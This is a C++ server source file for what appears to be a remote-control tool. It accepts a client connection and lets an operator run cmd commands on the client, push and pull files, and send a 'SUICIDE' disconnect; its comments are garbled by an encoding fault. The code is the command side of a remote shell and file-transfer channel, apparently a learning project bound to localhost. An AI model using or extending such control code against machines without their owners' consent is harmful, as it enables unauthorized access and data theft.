#include "entry.h"
#include "MyServer.h"
#include <iostream>
#include "Command.h"
#include <io.h>
#include <fcntl.h>
#include <limits>

#define IP "127.0.0.1"
#define PORT 65533
#define HEARTBEAT_TIME 10000
#define CMDSIZE 8192
#define FILE_PATH_LEN 256

HANDLE HeartBeat = NULL;
MySocket* myServer = NULL;
HANDLE hMutex = NULL;

DWORD WINAPI RecvHeartBeat(LPVOID lpThreadParameter) {
	MySocket* s = (MySocket*)lpThreadParameter;
	// ����һ������
	MySocket* RecvHB = s->New();

	while (true) {
		Sleep(HEARTBEAT_TIME);
		if (!RecvHB->MyRecvHeartBeat()) {
			RecvHB->FreeCopy();
			std::wcout << L"Recv HeartBeat Failed \n";
			std::wcout << L"Maybe Client disconnected \n";
			return 1;
		}
		std::wcout << L"Recv HeartBeat Success\n";

	}
	return 0;
}

bool Entry() {
	// ���߳�
	myServer = new MySocket;
	hMutex = CreateMutex(NULL, NULL, NULL);
	// ��ʼ��
	if (!myServer->SocketInit(hMutex)) {
		std::wcout << L"SocketInit Error\n";
		return false;
	}
reConnect:
	std::wcout << L"Wait for client connect\n";
	// ��ʼ����
	if (!myServer->Listen(PORT)) {
		std::wcout << L"Listen Error\n";
		return false;
	}
	// ��������
	if (!myServer->Accept()) {
		std::wcout << L"Accept Error\n";
		return false;
	}
	// ���տͻ��˷�������PC��Ϣ
	if (!myServer->RecvMsg()) {
		std::wcout << L"Recv PC Msg error\n";
		return false;
	}
	// �����������������߳�
	//HeartBeat = CreateThread(
	//	NULL, 0, (LPTHREAD_START_ROUTINE)RecvHeartBeat, (LPVOID)myServer, 0, NULL
	//);

	//if (HeartBeat == NULL) {
	//	std::wcout << L"Create Thread Error :" << GetLastError() << "\n";
	//	return false;
	//}

	// ���벢����ָ��
	UINT32 command = 0;
	wchar_t* Instruction = new wchar_t[CMDSIZE];
	char* recvbuf = new char[CMDSIZE];
	wchar_t* Res = new wchar_t[CMDSIZE];
	char* FileBuf = NULL;
	std::wcout << L"Please input the correct command:\n";
	std::wcout << L"Input 0 to get the help\n";
	while (true) {

		while (true) {
			std::cin >> command;

			// ��������Ƿ���Ч
			if (command != HELP			&&
				command != CMD			&&
				command != UPLOAD		&&
				command != DOWNLOAD		&&
				command != SCREENSHOT	&&
				command != SUICIDE) {
				std::cout << L"Incorrect command, please input correct command��" << std::endl;

				// �������״̬�ͻ�����
				rewind(stdin);
				std::cin.clear();
			}
			else {
				break;
			}
		}
		if (!myServer->SendCommand(command)) {
			std::wcout << L"Send Command Error: " << WSAGetLastError() << "\n";
			return false;
		}
		rewind(stdin);
		switch (command) {
		case HELP: {
			std::wcout << L"0 -> Help\n";
			std::wcout << L"1 -> Execute the cmd instruction(such as cmd.exe /c cd../ && dir)\n";
			std::wcout << L"2 -> Upload file to client\n";
			std::wcout << L"3 -> Download file from client\n";
			std::wcout << L"4 -> Get the screenshot of client\n";
			std::wcout << L"5 -> Disconnect with client\n";
			break;
		}
		case CMD: {
			std::wcout << L"Please input correct cmd instruction:\n";
			// ��ʼ��
			ZeroMemory(Instruction, CMDSIZE * sizeof(wchar_t));
			// ��ȡcmdָ��
			std::wcin.getline(Instruction, CMDSIZE);
			rewind(stdin);
			std::wcout << L"Input cmd command end\n";
			// ����
			if (!myServer->SendCmd(Instruction, recvbuf)) {
				std::wcout << L"Send cmd command error: " << WSAGetLastError() << "\n";
				return false;
			}
			// ����
			if (!myServer->RecvCmd(Res, recvbuf)) {
				std::wcout << L"Recv cmd command error" << WSAGetLastError() << "\n";
				return false;
			} {
				// �����������ִ�н��
				// ��ȡԭʼ����̨�������
				UINT originalOutputCP = GetConsoleOutputCP();
				// ���ÿ���̨�������ΪUTF-16
				SetConsoleOutputCP(CP_UTF8);
				int res = 0;
				// �� stdout ����Ϊ���ַ���
				res = _setmode(_fileno(stdout), _O_U16TEXT);
			
				std::wcout << Res << "\n";
				// �ָ�����̨�������ΪĬ�ϱ���
				SetConsoleOutputCP(originalOutputCP);
				// �� stdout ����ΪĬ��ģʽ
				res = _setmode(_fileno(stdout), _O_TEXT);
				//std::wcout << std::noskipws << Res;
				std::wcout << L"\nRecv result end\n";
			}
			break;
		}
		case UPLOAD: {
			// �ļ�·��
			wchar_t* path = new wchar_t[FILE_PATH_LEN];
			// �ļ�����
			UINT32 len = 0;
			ZeroMemory(path, FILE_PATH_LEN * sizeof(wchar_t));

			// �Ȼ�ȡ��Ҫ�ϴ���client�ı����ļ�·��
			std::wcout << L"Please enter the server file path\n";
			rewind(stdin);
			// D:\vsfiles\MySocket\Server\TESTFILE.txt
			std::wcin.getline(path, FILE_PATH_LEN);
			rewind(stdin);

			// ������ļ�·������
			if (wcslen(path) > FILE_PATH_LEN) {
				std::wcout << L"File path too long\n";
				break;
			}

			if (!myServer->ReadFromFile(path, &len, &FileBuf)) {
				std::wcout << L"ReadFromFile Error \n";
				return false;
			}

			// �ϴ����ļ�·��
			ZeroMemory(path, FILE_PATH_LEN * sizeof(wchar_t));
			std::wcout << L"Please enter the client file path\n";
			rewind(stdin);
			// D:\test.txt
			std::wcin.getline(path, FILE_PATH_LEN);
			rewind(stdin);

			// ������ļ�·������
			if (wcslen(path) > FILE_PATH_LEN) {
				std::wcout << L"File path too long\n";
				break;
			}
			// ����Ŀ���ļ���·��
			if (!myServer->SendCmd(path, recvbuf)) {
				std::wcout << L"Send file path error" << WSAGetLastError() << "\n";
				return false;
			}

			// �ٷ����ļ�
			if (!myServer->SendFile(FileBuf, len)) {
				std::wcout << L"Send File Error \n";
				return false;
			}

			delete[] path;
			delete[] FileBuf;

			break;
		}
		case DOWNLOAD: {
			// ������Ҫ���ص��ļ��ڿͻ����е�����·��
			wchar_t* path = new wchar_t[FILE_PATH_LEN];
			ZeroMemory(path, FILE_PATH_LEN * sizeof(wchar_t));

			std::wcout << L"Please enter the client file path\n";
			rewind(stdin);
			std::wcin.getline(path, FILE_PATH_LEN);
			rewind(stdin);
			// D:\test.txt
			//std::wcout << "Path is " << path << "\n";

			// ���ļ�·�����͸��ͻ���
			if (!myServer->SendCmd(path, recvbuf)) {
				std::wcout << L"Send file path error" << WSAGetLastError() << "\n";
				return false;
			}

			// ��new�ļ��Ŀռ�
			FileBuf = new char[FILEBUFFERLEN * sizeof(char)];
			ZeroMemory(FileBuf, FILEBUFFERLEN * sizeof(char));

			// �Ƚ��տͻ��˷����ı�־�� �����1�����ļ�·��������� 2��ʾ�ļ�����ʧ�ܣ�0��ʾ�ļ���������
			UINT32 flag = -1;
			if (!myServer->RecvIns(&flag)) {
				std::wcout << L"Recv Ins Error %d\n" << WSAGetLastError() << "\n";
				return false;
			}
			// �ɹ����ͻ����ļ�����ͽ���
			if (flag == SUCCESS) {
				// ���տͻ��˷��������ļ�
				if (!myServer->RecvFile(FileBuf, FILEBUFFERLEN)) {
					std::wcout << L"Recv File error %d\n" << WSAGetLastError() << "\n";
					return false;
				}
				// д��server·��
				wchar_t WritePath[] = L"Client file.txt";
				if (!myServer->WriteToFile(FileBuf, WritePath)) {
					std::wcout << L"write to file error %d\n" << GetLastError() << "\n";
					return false;
				}
			}
			// û���������ļ�
			else if (flag == NOSUCHFILE) {
				std::wcout << L"Open File Error, Maybe there not have this file, please input the correct client file path\n";
				break;
			}
			// ��ȡʧ��
			else if (flag == READERROR) {
				std::wcout << L"Read File To buf error, maybe this file size is too large\n";
				break;
			}
			std::wcout << L"Recv Client File Success\n";
			delete[] path;
			break;
		}
		case SCREENSHOT: {
			break;
		}
		case SUICIDE: {
			wchar_t* Suicide = (wchar_t*)L"SUICIDE";
			if (!myServer->Send(Suicide)) {
				// �Ͽ���ͻ��˵�����,���½������״̬
				//Sleep(HEARTBEAT_TIME);
				Sleep(HEARTBEAT_TIME);
				myServer->Free();
				goto reConnect;
			}
			break;
		}

		default:
			std::wcout << L"Incorrect command\n";
			break;
		}
	}
	delete[] Res;
	delete[] recvbuf;
	delete[] Instruction;
	//delete[] FileBuf;
	system("pause");

	delete myServer;
}
